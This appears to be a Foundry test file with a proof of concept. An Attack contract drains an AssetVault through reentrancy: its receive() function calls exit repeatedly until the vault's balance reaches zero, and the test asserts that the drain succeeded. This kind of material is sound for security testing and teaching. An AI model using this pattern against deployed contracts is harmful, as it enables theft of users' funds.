// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/reentracy.sol";
contract AssetVaultExploitTest is Test {
    AssetVault public vault;
    Attack public attacker;

    function setUp() public {
        // Fund this test contract with Ether
        vm.deal(address(this), 10 ether);
        vault = new AssetVault();
        attacker = new Attack(address(vault));

        // Ensure the vault has sufficient balance
        vm.deal(address(vault), 10 ether);
    }
    function testReentrancyExploit() public {
        // Log initial attacker balance
        uint256 initialAttackerBalance = address(attacker).balance;
        console.log("Attacker Initial Balance: ", initialAttackerBalance);
        // Attacker deposits enough Ether to avoid revert
        attacker.attackDeposit{value: 1 ether}();
        // Check if the vault has sufficient balance before exploit
        uint256 initialVaultBalance = address(vault).balance;
        console.log("Initial Vault Balance: ", initialVaultBalance);
        // Attacker initiates reentrancy exploit
        attacker.attackWithdraw(1 ether);
        console.log("Done with reentrancy exploit");
        // Log final attacker balance
        uint256 finalAttackerBalance = address(attacker).balance;
        console.log("Attacker Final Balance: ", finalAttackerBalance);
        // Verify vault's balance after exploit
        uint256 finalVaultBalance = address(vault).balance;
        console.log("Vault Balance After Attack: ", finalVaultBalance);
        // Assert that the vault balance was drained
        assertTrue(
            finalVaultBalance < initialVaultBalance - 1 ether,
            "Vault balance should have been drained due to reentrancy"
        );
    }
    receive() external payable {} // To accept Ether from the vault
}

contract Attack {
    AssetVault public vault; // Reference to the vulnerable AssetVault
    constructor(address _vault) {
        vault = AssetVault(_vault);
    }
    function attackDeposit() public payable {
        vault.enter{value: msg.value}(); // Deposits Ether into the vault
    }
    function attackWithdraw(uint256 _amount) public {
        vault.exit(_amount); // Initiates withdrawal to trigger reentrancy
    }
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.exit(1 ether); // Keep calling exit until funds are drained
        }
    }
}
